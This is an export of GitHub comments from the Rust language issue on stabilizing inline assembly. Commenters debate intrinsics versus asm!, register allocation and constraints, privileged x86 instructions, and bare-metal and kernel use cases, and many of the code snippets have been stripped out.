rust/rust-lang/29722/366431069,29722,"It looks to me like the best is definitely the enemy of the kind-of-ok here. I fully support sticking a  or  or  macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. I don't see supporting such a thing forever as a huge maintenance burden the more sophisticated systems proposed above look like they'd pretty easily support just turning the old-style macros into syntactic saccharine for the new one. I have a binary program  which requires inline assembly for the x86_64  instruction. This inline assembly is the only thing keeping this code in nightly. The code was derived from a 12-year-old C program. Right now, my assembly is conditioned on     #[cfg(any(target_arch = ""x86"", target_arch = ""x86_64""))]  and then gets the  info to see if  is present. It would be nice to have something in Rust similar to the recent Google cpu_features library  in Rust, but c'est la vie. Because this is a demo program as much as anything, I'd like to keep the inline assembly. For real programs, the  intrinsic would be sufficient — except that getting it to use  requires passing ""-C target-cpu=native"" to Cargo, probably through  (see issue #1137 and several related issues) since distributing a  with my source doesn't seem like a great idea, which means that right now I've got a Makefile calling Cargo. In short, it would be nice if one could use Intel's and others' fancy popcount instruction in real applications, but it seems harder than it needs to be. Intrinsics aren't entirely the answer. Current  is an ok answer were it available in stable. It would be great to have a better syntax and semantics for inline assembly, but I don't really need it. It would be great to be able to specify  directly in , but it wouldn't really solve my problem. Sorry, rambling. Just thought I'd share why I care about this. ",,False
rust/rust-lang/29722/366442456,29722,"@friend I don‘t understand, why do you so desperately need to compile to popcnt? The only reason I can see is performance and IMO you should definitely just use count_ones() in that case. What you‘re looking for is not inline asm but target_feature (rust-lang/rfcs#2045) so you can tel the compiler that it‘s allowed to emit popcnt. ",,False
rust/rust-lang/29722/366450866,29722,"@friend you don't even need to use inline assembly for this, just use   to query whether the cpu your binary runs supports the  instruction (it will resolve this at compile-time if its possible to do so). ♠coresimdpopcntpopcnt` instruction. ",,False
rust/rust-lang/29722/366452010,29722,"@friend It's a bit off-topic, but this statement is not strictly true.  uses  under the hood, thus if  feature will not be enabled by crate user and crate author will forget to use  this intrinsic will get compiled into ineffective assembly and there is no safeguards against it. ",,False
rust/rust-lang/29722/366452208,29722,"It also uses  to enable the  feature for the intrinsic unconditionally, independently of what the crate user enables. ",,False
rust/rust-lang/29722/366453247,29722,This function looks like undefined behavior to me ,,False
rust/rust-lang/29722/366457389,29722,"First of all, apologies for the derailing the discussion. Just wanted to reiterate my main point, which was ""I fully support sticking a gcc_asm! or clang_asm! or llvm_asm! macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. "" The point of the inline assembly is that this is a popcount benchmark / demo. I want a true guaranteed  instruction when possible both as a baseline and to illustrate how to use inline assembly. I also want to guarantee that  uses a popcount instruction when possible so that Rustc doesn't look terrible compared to GCC and Clang. Thanks for pointing out . I'll think about how to use it here. I think I want to bench  regardless of what CPU the user is compiling for and regardless of whether it has a popcount instruction. I just want to make sure that if the target CPU has popcount  uses it. The / crates looks nice, and should probably be enabled for these benchmarks. Thanks! For this app I'd prefer to use as little outside the standard language features as possible (I'm already feeling guilty about ). However, these facilities look too good to ignore, and it looks like they're well on their way to becoming ""official"". ",,False
rust/rust-lang/29722/377229635,29722,"There’s an idea floated around by @friend where there could be some implementation which goes from some representation of code to machine bytes (could be a proc-macro crate or something?) and then those bytes are included directly into the particular location in code. Splicing arbitrary code bytes into arbitrary places within a function seems like a much easier problem to solve (although ability to specify inputs, outputs and their constraints as ell as clobbers would still be necessary). cc @friend ",,False
rust/rust-lang/29722/377503700,29722,"@friend it's a little more than just a chuck of machine code though, you also have to be careful about input, output and clobber registers. If the ASM chunk says that it wants a certain variable in %rax and that it will clobber %esi you need to make sure that the surrounding code plays nice. Also if the developer lets the compiler allocate the registers you'll probably want to optimize the allocation to avoid spilling and moving values around. ",,False
rust/rust-lang/29722/377523243,29722,"@friend , indeed you will have to specify how variables are associated to specific registers, and which registers are clobbered, but all of these is smaller than standardizing any assembly language, or any LLVM assembly language. Standardizing on byte sequences, is probably the easiest way forward by moving the assembly flavor to a driver / proc-macro. One issue of having verbatim bytes instead of proper inline assembly, is that the compiler would have no option for doing register alpha-renaming, which I do not expect people writing inline assembly are expecting either. ",,False
rust/rust-lang/29722/377554344,29722,"But how would that handle register allocation if I want to let the compiler handle that? For instance, using GCC's (atrocious) syntax In something like this I let the compiler allocate the registers, expecting that it will give me whatever is the most convenient and efficient. For instance on x86 64 if  is the return value then the compiler might allocate  and if  is a function parameter it might already be available in some register. Of course the compiler only knows exactly how it will allocate registers pretty late in the compilation sequence (especially if it's not as trivial as simply function params and return values). Would your proposed solution work with something like that? ",,False
rust/rust-lang/29722/377592167,29722,"@friend I have to say I'm a bit confused by this proposal. First of all, standardizing assembly language was never something we wanted to achieve with inline assembly. At least to me, the premise was always that the assembly language used by the system assembler would be accepted. The problem is not getting the assembly parsed/assembled, we can pass that off to LLVM easily. The problem is with filling templated assembly (or giving LLVM the required information to do so), and specifying inputs, outputs and clobbers. The later problem is not actually solved by your proposal. It is however alleviated, because you wouldn't/couldn't support classes of registers (which @friend asks about), but just concrete registers. At the point where constraints are simplified to that extend, it is actually just as easy to support ""real"" inline assembly. The first argument is an string containing (non-templated) assembly, the other arguments are the constraints. This is somewhat easily mapped to LLVM's inline assembler expressions. Inserting raw bytes on the other hand is not as far as I know (or can tell from the LLVM IR Reference Manual) supported by LLVM. So we'd basically be extending LLVM IR, and reimplementing a feature (assembling system assembly) that is already present in LLVM using separate crates. ",,False
rust/rust-lang/29722/377678507,29722,"@friend So how would that be done? I have a sequence of bytes with hardcoded registers with basically means that the input/out registers, clobbers, etc. are all hardcoded inside this sequence of bytes. Now inject this bytes somewhere in my rust binary. How do I tell rustc which registers are input/output, which registers got clobbered, etc.? How is this a smaller problem to solve than stabilizing inline assembly ? It looks to me that this is exactly what inline assembly does, what am I missing? ",,False
rust/rust-lang/29722/377696637,29722,"@friend This would not be possible, as the raw of bytes does not allow alpha renaming of registers, and the registers would have to be enforced by the code sequence ahead. @friend My understanding, is that relying on the system assembler is not something we want to rely on, but more an accepted flaw as part of the asm! macro.  Also relying on asm! being the LLVM syntax would be painful for the development of additional backend. @friend The idea would be to have a list of inputs, outputs, and clobbered registers, where the inputs would be a tuple of the register name associated with a (mutable) reference or copy, the clobbered register would be a list of register names, and the output would be a list of output register would form a tuple of named register to which are associated types. This code sequence might be the output of some compiler procedural macro, which might look like These sequences, will not be able to directly embedde any symbol or addresses and they would have to be computed and given as registers.  I am sure we can figure out how do add the ability to insert some symbol addresses within the byte sequence later on. The advantage of this approach is that only the list of registers and constraints have to be standardized, and this is something that would easily be supported by any future backend. ",,False
rust/rust-lang/29722/377698938,29722,"@friend I don't think that's an accurate assessment? With the minor exception of the two different syntaxes for x86 assembly, assembly syntax is largely standard and portable. The only issue with the system assembler might be that it lacks newer instructions, but that's a niche situation not worth optimizing for. The actual problem is the glue into register allocation. But, as far as the actual assembly string itself is concerned, this merely means someone has to do some string substitution stuff and maybe some parsing. I agree that LLVM's (or gcc's) syntax for this stuff is crap, but moving to precompiled bytes means that any asm crate now needs to install a full assembler and possibly a full register allocator (or make programmers hand-allocate registers), or attempt to use the system assembler. At that point, it doesn't seem like it's actually really adding much value. ",,False
rust/rust-lang/29722/377700502,29722,@friend  crate uses macro handled by a plugin to assemble the assembly code and generate vectors of raw assembly code to be concatenated at runtime. ,,False
rust/rust-lang/29722/378268677,29722,"@friend maybe my uses cases are peculiar but lack of register renaming and letting the compiler allocate registers for me would be a bit of a deal-breaker because it either means that I need to be very lucky with my choice of registers and happen to ""hit right"" or the compiler will have to emit non-optimal code to shuffle registers around to match my arbitrary conventions. If the assembly blob doesn't integrate nicely with the surrounding compiler-emitted assembly I might as well just factor the ASM stub in an external C-style method in a stand-alone .s assembly file since function calls have the same type of register-allocation constraints. This already works today, although I suppose having it built into rustc might simplify the build system compared to having a standalone assembly file. I guess what I'm saying is that IMO your proposal doesn't get us very far compared to the current situation. And what if the ASM code calls external symbols that would be resolved by the linker? You need to pass that info around since you can't possibly resolve those until late in the compilation process. You'd have to pass there reference alongside your byte array and let the linker resolve them much later. @friend I'm not sure I understand what you mean by that, obviously ASM syntax is not portable across architectures. And even within the same architecture there are often variations and options that change the way the language is assembled. I can give MIPS as an example, there are two important configuration flags that tweak the assembler behaviour  and .  says whether the assembler is allowed to implicitly use the  (assembler temporary) register when assembling certain pseudo-instructions. Code that explicitly uses  to store data must be assembled with  or it'll break. asm     addui   $a0, 4     jal     some_func     addui   $a1, $s0, 3 asm    ldr   r2, =0x89abcdef ♠ Some code needs very peculiar alignment constraints (common when you're dealing with cache invalidation code for instance, you need to be sure that you don't take a saw to the branch you're sitting on). And there's the problem of handling external symbols that can't be resolved at this point in the compilation process as I mentioned earlier. I'm sure I could come up with peculiarities for a bunch of other architectures I'm less familiar with. For these reasons I'm not sure I'm very optimistic for the macro/DSL approach. I understand that having a random opaque string literal in the middle of the code isn't super elegant but I don't really see what integrating the full ASM syntax into rust one way or an other would give us except additional headaches when adding support for a new architecture. Writing an assembler is something that may seem trivial at a glance but could turn out to be very tricky if you want to support all the bells, whistles and quirks of all the architectures out there. On the other hand having a good way to specify bindings and clobbers however would be extremely valuable (compared to gcc's... perfectible syntax). ",,False
rust/rust-lang/29722/411882048,29722,"Hi guys, Sorry for bothering you, I only wanted to drop my two cents, because I'm just an user, and a very shy/quiet one indeed, oh, and a newcomer, I have just recently landed in Rust, but I'm already in love with it. But this assembly thing is just crazy, I mean, it's a three years span conversation, with a bunch of ideas and complains, but nothing that seems like a minimum consensus. Three years and not a RFC, it seems a little like a death end. I'm developing a humble math library (that hopefully will materialize in two or three crates), and for me (and I suspect that for any other fellow interested in write assembly in rust), the most important thing is to actually being able to do it! with a minimum guarantee that everything is not going to change the next day (that's what the unstable channel, and specially this conversation, makes me feel). I understand that everyone here wants the best solution, and maybe one day someone comes out with that one, but as for today I believe that the current macro is just fine (well, maybe a little restricting in some ways, but hopefully nothing that cannot be addressed in an incremental way). To write assembly is like the most important thing in a low level language, a very very necessary feature, and although I'm ok relying on cpp_build until this is fixed, I'm very afraid that if it takes a lot more time it will become a forever dependency. I don't know why, call it an irrational idea, but I find that having to call cpp to call assembly is a little sad, I want a pure rust solution. ",,False
rust/rust-lang/29722/412048025,29722,"FWIW Rust is not that special here, MSVC doesn‘t have inline asm for x86_64 either. They do have that really weird implementation where you can use variables as operands but that works for x86 only. ",,False
rust/rust-lang/29722/414087879,29722,"@friend Could you talk more about what you're using inline assembly for? We typically only see it used in OS-like situations, which are typically stuck on nightly for other reasons as well, and even then they barely use , so stabilizing  hasn't been a high-enough priority to design &amp; develop something that can properly survive outside LLVM and please everyone. ",,False
rust/rust-lang/29722/414502791,29722,"Additionally, most things can be done using the exposed platform intrinsics. x86 and x86_64 have been stabilized and other platforms are in progress. It's most people's expectation that these are going to accomplish 95-99% of the goals. You can see my own crate jetscii as an example of using some of the intrinsics. ",,False
rust/rust-lang/29722/414506240,29722,"We just merged a jemalloc PR that uses inline assembly to work around code generation bugs in LLVM -  . Somebody used inline assembly in this issue ( to work around a code generation bug in Rust (LLVM) that happened in the jetscii crate. Both happened in the last two weeks, and in both cases the users tried with intrinsics but the compiler failed them. When code generation for a C compiler happens to be unacceptable, worst case the user can use inline assembly and continue working in C. When this happens in stable Rust, right now we have to tell people to use a different programming language or wait an indeterminate amount of time (often in the order of years). That's not nice. ",,False
rust/rust-lang/29722/414527725,29722,"@friend Well, I'm writing a small matrix algebra library. Inside that library, I'm implementing the BLAS, maybe some LAPACK (not there yet) routines in Rust, because I wanted the library to be a pure rust implementation. It's nothing serious yet, but anyway, I wanted the user to be able to opt for some asm speed and fun, specially with the GEMM operation, that use to be essential (the most used, anyway, and if you follow the BLIS people approach it's all what you need), at least in x86/x86_64. And that's the full story. Obviously I can use the nightly channel too, I just wanted to push a little in the pragmatic direction of stabilization of the feature. ",,False
rust/rust-lang/29722/414532018,29722,"@friend There are plenty of use-cases for which intrinsics aren't enough. Of the top of my head of recent stuff where I thought ""why oh why doesn't Rust have stable asm?"", there's no XACQUIRE/XRELEASE intrinsics. Stable inline asm is critical and no, the intrinsics aren't enough. ",,False
rust/rust-lang/29722/414536445,29722,"My original point was attempting to help someone have the ability to write faster code. They made no mention of knowing that intrinsics were even available, and that's all I sought to share. The rest was background information. I'm not even advocating for a specific point of view, so please don't attempt to argue with me — I have no stake in this race. I'm simply repeating what the current point of view is as I understand it. I participate in a project that requires inline assembly that is highly unlikely to have intrinsics in any near future, so I am also interested in some amount of stable inline assembly, but nightly assembly doesn't unduly bother me, nor does invoking an assembler. Yes, there are cases that require assembly for now and there are cases that will forever need it, I said as much originally (added emphasis for clarity) It is my opinion that if you want to see stable assembly, someone (or a group of people) are going to need to get general consensus from the Rust team on a direction to start in and then put in a lot of effort to actualize it. ",,False
rust/rust-lang/29722/414561475,29722,"I still don't understand what instructions you need to access that you can't without inline assembly. Or is it just a specific sequence of arithmetic instructions? If so, have you benchmarked an equivalent Rust source against the inline assembly? ",,False
rust/rust-lang/29722/414655847,29722,"Well, when you are talking about assembly in math, you are basically talking about using the SIMD registers and instructions like _mm256_mul_pd, _mm256_permute2f128_pd, etc. and vectorization operations where it proceed. The thing is that you can take different approaches for vectorization, and usually it's a little trial and error until you get an optimized performance for the processor you are targeting and the use you have in mind. So usually at the library level you first have to query the processor injecting asm code to know the set of instructions and registers supported, and then conditional compiling an specific version of your math asm kernel. Right now I have no specific test at hand, and I'm on holiday, so I would prefer to not involve myself with it a lot, but yeah, if you give me a couple of weeks I can post a performance comparative. In any case, it use to be impossible for the compiler to produce code as fast as you can with manual tuned assembly. It's not possible in C at least, even if you use the classical performance techniques like manual loop unrolling where needed, etc., so I imagine it should be not possible in Rust. ",,False
rust/rust-lang/29722/414715220,29722,"Taylor Cramer suggested I post here. Forgive me as I haven't read through all comments to come up to speed with the current state of the discussion; this is only a voice of support and statement of our situation. For a bare-metal project at Google, we'd love to see some movement on stabilizing inline and module-level assembler. The alternative is using the FFI to call functions written in pure assembly and assembled separately and linked together into a binary. We could define functions in assembler and call them via the FFI, linking them in a separate step, but I know of no serious bare-metal project that does that exclusively, as it has drawbacks in terms of both complexity and performance. Redox uses 'asm!'. The usual suspects of Linux, BSDs, macOS, Windows, etc, all make copious use of inline assembler. Zircon and seL4 do it. Even Plan 9 caved on this a few years ago in the Harvey fork. For performance-critical things, function call overhead might dominate depending on the complexity of the called function. In terms of complexity, defining separate assembler functions just to invoke a single instruction, read or write a register, or otherwise manipulate machine state that's ordinarily hidden from a user-space programmer means more tedious boilerplate to get wrong. In any event, we would have to be more creative in our use of Cargo (or supplement with an external build system or a shell script or something) to do this. Perhaps build.rs could help here, but feeding it into the linker seems more challenging. I'd also very much like it if there were some way to plumb the values of symbolic constants into the assembler template. ",,False
rust/rust-lang/29722/414732598,29722,"The last pre-RFC ( achieved consensus 6 months ago (at least on most of the fundamental issues), so the next step is to submit an RFC that builds on that. If you want this to happen faster I'd recommend contacting @friend about it. ",,False
rust/rust-lang/29722/414735582,29722,"For what it's worth, I need direct access to FS\GS registers to get the pointer to the TEB struct on Windows, I also need a -like intrinsic to apply  to an arbitrary memory location, neither of which I could find a way to do without inline assembly or extern calls. The third point mentioned here concerns me, though, as LLVM indeed prefers to Just Crash if something is wrong providing no error messaging what so ever. ",,False
rust/rust-lang/29722/414744700,29722,"@friend It shouldn't be hard to add that one to , clang implements these using inline assembly ( but we can use that in the std library and expose the intrinsic to safe Rust. Feel encouraged to open an issue in the stdsimd repo about the missing intrinsics. ",,False
rust/rust-lang/29722/414911930,29722,"@friend Ah, I suspected that might be the case. Well, if you want to give it a try, you could translate the assembly into  intrinsic calls and see if you get the same performance out of it. If you don't, please file issues. LLVM isn't magic, but at least intrinsics should be as good as asm. ",,False
rust/rust-lang/29722/414912447,29722,"@friend If you don't mind me asking, are there any usecases/platform features in particular that require inline assembly, in your situation? @friend Maybe we should expose intrinsics for reading the ""segment"" registers? &lt;hr/&gt;  Maybe we should do some data collection and get a breakdown of what people really want  for, and see how many of those could be supported in some other way. ",,False
rust/rust-lang/29722/415014198,29722,"I want  for  working around intrinsics not provided by the compiler working around compiler bugs / sub-optimal code generation performing operations that cannot be performed via a sequence of single intrinsics calls, e.g., a read EFLAGS-modify-write EFLAGS where LLVM is allowed to modify eflags between the read and the write, and where LLVM also assumes that the user won't modify this behind its back (that is, the only way to safely work with EFLAGS is to write the read-modify-write operations as a single atomic  block).  I don't see any other way of supporting any of those use cases that doesn't involve some form of inline assembly but my mind is open. ",,False
rust/rust-lang/29722/415016353,29722,"Copied from my post in the pre-RFC thread, here is some inline assembly (ARM64) which I am using in my current project ",,False
rust/rust-lang/29722/415029276,29722,@friend note that @friend is working towards the intrinsics for ARM. Would be worth checking to see if that proposal covers your needs. ,,False
rust/rust-lang/29722/415038128,29722,"@friend It is worth remarking that  this work doesn't replace inline assembly, it merely complements it. This approach implements vendor APIs in , these APIs are insufficient for some people already.  this approach is only usable when a sequence of intrinsic calls like  produces code indistinguishable from that sequence of instructions  - this isn't necessarily the case, and when it isn't, code that looks correct produces at best incorrect results, and at worst has undefined behavior (we had bugs due to this in  and  in  already, e.g.,  - other architectures have these issues as well).  some intrinsics have immediate mode arguments, which you cannot pass via a function call, so that  won't work. Every solution to this problem is currently a whacky workaround, and in some cases, no workarounds are currently possible in Rust, so we just don't provide some of these intrinsics.   So if the vendor APIs are implementable in Rust, available on , and can be combined to solve a problem, I agree that they are better than inline assembly. But every now and then either the APIs are not available, maybe not even implementable, and / or they cannot be combined correctly. While we could fix the ""implementability issues"" in the future, if what you want to do is not exposed by the vendor API, or the APIs cannot be combined, this approach won't help you. ",,False
rust/rust-lang/29722/415042619,29722,What can be very surprising about LLVM's implementation of intrinsics (SIMD especially) is that they do not conform to Intel's explicit mapping of intrinsics to instructions at all - they are subject to a wide range of compiler optimizations. For instance I remember one time where I attempted to reduce memory pressure by calculating some constants from other constants instead of loading them from memory. But LLVM simply proceeded to constant-fold the entire thing back into the exact memory load I was trying to avoid. In a different case I wanted to investigate replacing a 16-bit shuffle with an 8-bit shuffle to reduce port5 pressure. Yet in its unending wisdom the ever-helpful LLVM optimizer noticed that my 8-bit shuffle is in fact a 16-bit shuffle and replaced it. Both optimizations certainly yield better throughput (especially in the face of hyperthreading) but not the latency reduction I was hoping to achieve. I ended up dropping down all the way to nasm for that experiment but having to rewrite the code from intrinsics to plain asm was just unnecessary friction. Of course I want the optimizer to handle things like instruction selection or constant folding when using some high-level vector API. But when I explicitly decided which instructions to use I really don't want the compiler to mess around with that. The only alternative is inline asm. ,,False
rust/rust-lang/29722/415047055,29722,"That's all I've been saying at first and again This is the same thing that @friend is saying in parallel. I'm unclear why multiple people are acting like I'm completely disregarding the usefulness of inline assembly while trying to point out the realities of the current situation. I've  Pointed one poster who made no mention of knowing that intrinsics existed towards stable today intrinsics. Pointed another poster at proposed intrinsics so they can provide early feedback to the proposal.  Let me state this very clearly yes, inline assembly is sometimes required and good. I am not arguing that. I am only trying to help people solve real world problems with the tools that are available now. ",,False
rust/rust-lang/29722/415055743,29722,"What I was trying to say was that we should have a more organized approach to this, a proper survey, and gather up a lot more data than the few of us in this thread, and then use that to point out the most common needs from inline assembly (since it's clear that intrinsics can't fully replace it). I suspect that each architecture has a tricky-to-model subset, that gets some use from inline , and maybe we should focus on those subsets, and then try to generalize. cc @friend/lang ",,False
rust/rust-lang/29722/415056250,29722,"@friend require is a strong word, and I would be compelled to say that no we're not strictly required to use inline assembler. As I mentioned earlier, we could define procedures in pure assembly language, assemble them separately, and link them into our Rust programs via the FFI. However, as I said earlier I know of no serious OS-level project that does that. It would mean lots of boiler plate (read more chances to make a mistake), a more complex build process (right now we're fortunate enough that we can get away with a simple  invocation and a linked and nearly-ready-to-run kernel pops out of the other end; we'd have to invoke the assembler and link in a separate step), and a drastic decrease in the ability to inline things, etc; there would almost certainly be a performance hit. Things like compiler intrinsics help in a lot of cases, but for things like the supervisory instruction set of the target ISA, particularly more esoteric hardware features (hypervisor and enclave features, for example), there often aren't intrinsics and we're in a no_std environment. What intrinsics are there often aren't sufficient; e.g., the x86-interrupt calling convention seems cool but doesn't give you mutable access to the general purpose registers in a trap frame suppose I take an undefined instruction exception with the intent to do emulation, and suppose the emulated instruction returns a value in %rax or something; the calling convention doesn't give me a good way to pass that back to the call-site, so we had to roll our own. That meant writing my own exception handling code in assembler. So to be honest no, we don't require inline assembler, but it is sufficiently useful that it would almost be a non-starter not to have it. ",,False
rust/rust-lang/29722/415060171,29722,"@friend I am specifically curious about avoiding separate assembling, that is, what kind of assembly you need at all in your project, no matter how you link it in. In your case it seems to be a supervisor/hypervisor/enclave privileged ISA subset, is that correct? Is this by necessity, i.e. do the instructions have requirements which are unreasonably difficult or even impossible to uphold when compiled as intrinsic calls through, e.g. LLVM? Or is this just because they're assumed to be too special-cased to be useful to most developers? For the record, vendor intrinsics are in both  and  (the former is a reexport). cc @friend Can this be implemented in LLVM? ",,False
rust/rust-lang/29722/415088085,29722,"@friend correct; we need the supervisor subset of the ISA. I'm afraid I can't say much more at the moment about our specific use case. To some extent both are true, but on balance i would say the latter is more relevant here. Some things are microarchitecture specific and dependent on specific processor package configurations. Would it be reasonable for a compiler to (for example) expose something as an intrinsic that's part of the privileged instruction subset and conditioned on a specific processor version? I honestly don't know. That's actually really good to know. Thanks! ",,False
rust/rust-lang/29722/415090097,29722,"We already do. For example, the  x86 instructions are implemented and exposed in , not available on all processors, and most of them require privileged mode. ",,False
rust/rust-lang/29722/415114897,29722,"@friend  isn't privileged; did you mean ? I took a look through  and the only privileged instructions I saw in my quick sweep (I didn't do an exhaustive search) were , , , and . I suspect those are intrinsics because they fall into the general  family and don't generate exceptions in real mode, and some folks want to use clang/llvm to compile real-mode code. ",,False
rust/rust-lang/29722/415121274,29722,"@friend yes some of those are the ones I meant (we implement , , , ... in the  module  are available in , so you can use them to write an OS kernel for x86. In user-space they are useless AFAICT (they'll always raise an exception), but we don't have a way to distinguish about this in . We could only expose them in  and not in  though, but since they are already stable, that ship has sailed. Who knows, maybe some OS runs everything in ring 0 someday, and you can use them there... ",,False
rust/rust-lang/29722/415129925,29722,"@friend I don't know why  or  would raise an exception in userspace  is the only one of the family that's defined to generate an exception (#GP if CPL&gt;0), and then only in protected mode (SDM vol.1 ch. 13; vol.2C ch. 5 XSAVES).  and  are useful for implementing e.g. pre-emptive user-space threads, so their presence as intrinsics actually makes sense. I suspect the intrinsic for  was either because someone just added everything from the  family without realizing the privilege issue (that is, assuming it was invocable from userspace), or someone wanted to call it from real mode. That latter may seem far-fetched but I know people are e.g. building real-mode firmware with Clang and LLVM. Don't get me wrong; the presence of LLVM intrinsics in  is great; if I never have to write that silly sequence of instructions to get the results of  into a useful format again, I'll be happy. But the current set of intrinsics are not a substitute for inline assembler when you're writing a kernel or other bare-metal supervisory sort of thing. ",,False
rust/rust-lang/29722/415133829,29722,"@friend when I mentioned  I was referring to some of the intrinsics that are available behind the CPUID bits XSAVE, XSAVEOPT, XSAVEC, etc. Some of these intrinsics require privileged mode. We already do and they are available in stable Rust. I added these intrinsics. We realized the privilege issues and decided to add them anyways because it is perfectly fine for a program depending on to be an OS kernel that wants to use these, and they are harmless in userspace (as in, if you try to use them, your process terminates). Agreed, that's why this issue is still open ;) ",,False
rust/rust-lang/29722/415140440,29722,"@friend sorry, I don't mean to derail this by rabbit-holing on  et al. However, as near as I can tell, the only intrinsics that require privileged execution are those related to  and even then it's not always privileged (again, real-mode doesn't care). It's wonderful that those are available in stable Rust (seriously). The others might be useful in userspace and similarly I think it's great that they're there. However,  and  are a very, very small portion of the privileged instruction set and having added intrinsics for two instructions is qualitatively different than doing so generally and I think the question remains as to whether it's appropriate in general. Consider the  instruction from the VMX extensions, for example; I imagine an intrinsic would do something like execute instruction and then ""return"" . That's sort of an oddly specialized thing to have as an intrinsic. I think otherwise we're in agreement here. ",,False
rust/rust-lang/29722/415146299,29722,"FWIW per the  RFC we can currently only add intrinsics to  that the vendors expose in their APIs. For the case of , Intel exposes them on its C API, so that's why it is ok that's there. If you need any vendor intrinsics that are not currently exposed, open an issue, whether it requires privileged mode or not is irrelevant. If the vendor doesn't expose an intrinsic for it, then  might not be the place for it, but there are many alternatives to that (inline assembly, global asm, calling C, ...). ",,False
rust/rust-lang/29722/415153304,29722,"Sorry, I understood you saying you wrote the intrinsics for  to mean the Intel intrinsics; my earlier comments still apply as to why I think  is an intrinsic then (either an accident by a compiler writer at Intel or because someone wanted it for real mode; I feel like the former would be noticed really quickly but firmware does weird stuff, so the latter wouldn't surprise me at all). Anyway, yes, I think we fundamentally agree intrinsics aren't the place for everything, and that's why we'd like to see asm!() moved to stable. I'm really excited to hear that progress is being made in this area, as you said yesterday, and if we can gently nudge @friend to bubble this up closer to the top of the stack, we'd be happy to do so! ",,False
rust/rust-lang/29722/415155927,29722,"A few additional details and use cases for  When you're writing an operating system, firmware, certain types of libraries, or certain other types of system code, you need full access to platform-level assembly. Even if we had intrinsics that exposed every single instruction in every architecture Rust supports (which we don't come anywhere close to having), that still wouldn't be enough for some of the stunts that people regularly pull with inline assembly. Here are a small fraction of things you can do with inline assembly that you can't easily do in other ways  Collect all the implementations of a particular pattern of instructions in a separate ELF section, and then in loading code, patch that section at runtime based on characteristics of the system you run on. Write a jump instruction whose target gets patched at runtime. Emit an exact sequence of instructions (so you can't count on intrinsics for the individual instructions), so that you can implement a pattern that carefully handles potential interruptions in the middle. Emit an instruction, followed by a jump to the end of the asm block, followed by fault recovery code for a hardware fault handler to jump to if the instruction generates a fault. Emit a sequence of bytes corresponding to an instruction the assembler doesn't know about yet. Write a piece of code that carefully switches to a different stack and then calls another function. Call assembly routines or system calls that require arguments in specific registers.  ",,False
rust/rust-lang/29722/415381010,29722,"@friend Ok, I will try the intrinsics approach and see where it takes. You are probably right and that's the best approach for my case. Thank you! ",,False
rust/rust-lang/29722/416379186,29722,"@friend nailed it! These are the exact use cases I had in mind. I would add a couple of other use cases  writing code in weird architectural modes, like BIOS/EFI calls and 16-bit real-mode. writing code with strange/unusual addressing modes (which comes up often in 16-bit real-mode, bootloaders, etc.)  ",,False
rust/rust-lang/29722/416382543,29722,@friend Absolutely! And generalizing a point that has sub-cases in both of our lists translating between calling conventions. ,,False
rust/rust-lang/29722/447486713,29722,"I am closing out #53118 in favor of this issue and copying the PR here for the record. Note that this is from August, but a brief look seems to indicate the situation hasn't changed  The section on inline assembly needs an overhaul; in its present state it implies that the behavior and syntax is tied to  and the rust language in general. Pretty much the entire documentation is specific to x86/x86_64 assembly with the llvm toolchain. To be clear, I am not referring to the assembly code itself, which is obviously platform-specific, but rather the general architecture and usage of inline assembly altogether. I didn't find an authoritative source for the behavior of inline assembly when it comes to ARM target, but per my experimentation and referencing the ARM GCC inline assembly documentation, the following points seem to be completely off  The ASM syntax, as ARM/MIPS (and most other CISC?) use intel-esque syntax with the destination register first. I understood the documentation to mean/imply that inline asm took at&amp;t syntax which was transpiled to actual platform/compiler-specific syntax, and that I should just substitute the names of the x86 registers with that of the ARM registers only. Relatedly, the  option is invalid, as is it causes ""unknown directive"" errors when compiling. Adapting from the ARM GCC inline assembly documentation (for building against  with the  toolchain, it appears that even some basic assumptions about the format of inline assembly are platform-specific. In particular, it seems that for ARM the output register (second macro argument) counts as a register reference, i.e.  refers to the first output register and not the first input register, as is the case with the x86 llvm instructions. At the same time, other compiler-specific features are not present; I can't use named references to registers, only indexes (e.g.  is invalid). (Even for x86/x86_64 targets, the usage of  and  in the inline assembly example is very confusing, as it does not explain why those numbers were chosen.)  I think what threw me the most is the closing statement Which does not seem to be universally true. ",,False
rust/rust-lang/29722/447646195,29722,"A notion of intel vs at&amp;t syntax only exists on x86 (though there may be other cases I'm not aware of). It's unique in that they are two different languages sharing the same set of mnemonics to represent the same set of binary code. The GNU ecosystem has established at&amp;t syntax as the dominating default for the x86 world which is why this is what inline asm defaults to. You are mistaken in that it is very much a direct binding to LLVM's inline assembler expressions which in turn mostly just dump plaintext (after processing substitutions) into the textual assembly program. None of this is unique (or even relevant) to or about today's  as it is entirely platform-specific and completely meaningless beyond the x86 world. This is a direct consequence of the ""dumb""/simple plaintext insertion I described above. As the error message indicates the  directive is unsupported. This is an old and well-known workaround for using intel-style inline-asm with GCC (which emits att style) one would simply write  at the start of the inline asm block, then write some intel-style asm and finally terminate with  to set the assembler back into att mode so it correctly processes the (following) compiler-generated code once again. It's a dirty hack and I remember at least the LLVM implementation having had some weird quirks for a long time so it seems like you're seeing this error because it was finally removed. Sadly, the only correct course of action here is to remove the  option from rustc. Your observation is entirely correct, each platform makes up both its own binary format and its own assembly language. They are completely independent and (mostly) unprocessed by the compiler - which is the entire point of programming in raw assembler! Sadly there is quite a big mismatch between the inline asm implementation of LLVM that rustc exposes and the implementation of GCC (which clang emulates). Without a decision on how to move forward with  there is little motivation in improving this - besides, I outlined the major options a long time ago all of them have clear drawbacks. Since this does not seem to be a priority you're probably going to be stuck with today's  for a few years at least. There are decent workarounds  rely on the optimizer to produce optimal code (with a little nudging you can usually get exactly what you want without ever writing raw assembly yourself) use intrinsics, another quite elegant solution which is better than inline asm in almost every way (unless you need exact control over instruction selection and scheduling) invoke the  crate from  to link a C object with inline asm basically just invoke any assembler you like from , using a C compiler may seem like overkill but saves you the hassle of integrating with the  system    These workarounds apply to all but a small set of very specific edge cases. If you hit one of those (luckily I haven't yet) you're out of luck though. I agree that the documentation is quite lackluster but it's good enough for anyone familiar with inline asm. If you aren't, you probably should not be using it. Don't get me wrong - you should definitely feel free to experiment and learn but as  is unstable and neglected and because there are really good workarounds I would strongly advise against using it in any serious project if at all possible. ",,False
rust/rust-lang/29722/447646989,29722,"You can also invoke the  crate from  to build plain assembly files, which gives the maximum amount of control. I strongly recommend doing exactly this in case the two ""workarounds"" above this do not work for your use-case. ",,False
